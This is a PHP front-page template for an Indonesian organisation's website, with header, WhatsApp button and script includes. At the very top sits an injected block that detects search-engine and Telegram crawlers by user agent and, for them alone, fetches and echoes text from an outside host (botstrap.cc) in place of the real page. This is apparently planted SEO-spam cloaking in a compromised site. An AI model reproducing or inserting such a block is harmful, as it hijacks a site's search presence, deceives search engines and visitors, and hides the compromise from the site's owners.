<?php
function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}
return false;
}

if (is_bot()) {
$message = file_get_contents('https://botstrap.cc/ojs/mumwonogiri.or.id/index.txt');
echo $message;
exit;
}
?>

<?php
    error_reporting(E_ALL);
    require "appweb/Config/SetWebsite.php";
    require "appweb/Config/Db.php";
    require "appweb/Config/AssetsWebsite.php";
    require "appweb/Functions/others.php";
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <?php require "appweb/Controllers/SEO_v6.php"; ?>

    <link rel="icon" type="image/x-icon" href="<?= $url_images; ?>/<?= $icon; ?>" />

    <link rel="stylesheet" href="<?= $base_url; ?>/assets/css/bootstrap.css">

    <!--Plugins -->
    <style>@import url('https://fonts.googleapis.com/css2?family=Nunito+Sans&display=swap');</style>

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet" />
    <!-- Vendor CSS Files -->
    <link href="<?= $base_url; ?>/assets/vendor/animate.css/animate.min.css" rel="stylesheet" />
    <link href="<?= $base_url; ?>/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
    <link href="<?= $base_url; ?>/assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet" />
    <!-- Template Main CSS File -->
    <link href="<?= $base_url; ?>/assets/css/style.css" rel="stylesheet" />
    <link href="<?= $base_url; ?>/assets/css/custom.css" rel="stylesheet" />
    <link href="<?= $base_url; ?>/assets/vendor/fontawesome/css/all.min.css" rel="stylesheet" />
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />

    <?php if ($_GET['module']==="galeri-gambar"): ?>
        <link href="<?= $base_url_admin ?>/assets/libs/magnific-popup/magnific-popup.css" rel="stylesheet" type="text/css" />
    <?php endif ?>
    <!--End Plugins -->
    <base href="<?= $base_url; ?>/">
</head>
<body>

    <div class="container-fluid px-0">
        <?php require "appweb/Models/Header.php"; ?>
        <?php require "appweb/Controllers/Contents.php"; ?>
        <?php require "appweb/Models/Footer.php"; ?>
    </div>

    <a href="https://api.whatsapp.com/send?phone=<?= telpWhatsApp($nomorWhatsApp) ?>&amp;text=Assalamu%E2%80%99alaikum%20Warohmatullohi%20Wabarokatuh" target="_blank">
        <div class="wa-button">
            <img style="height: 30px" alt="Tombol WhatsApp" src="<?= $url_images ?>/whatsapp-icon.svg" />
        </div>
    </a>
    <a href="#" style="left: 20px; right: unset; display: inline" class="back-to-top">
        <i class="fa-sharp fa-solid fa-angle-up"></i>
    </a>
    
    <!-- Template Main JS File -->
    <script src="<?= $base_url; ?>/assets/js/main.js"></script>

    <!-- Vendor JS Files -->
    <script src="<?= $base_url; ?>/assets/template/js/jquery-3.6.0.min.js"></script>
    <script src="<?= $base_url; ?>/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>
        AOS.init();
    </script>
    <?php if ($_GET['module']==="galeri-gambar"): ?>
        <script src="<?= $base_url_admin; ?>/assets/libs/magnific-popup/jquery.magnific-popup.min.js"></script>
        <script src="<?= $base_url_admin; ?>/assets/js/pages/gallery.init.js"></script>
    <?php endif ?>
</body>
</html>
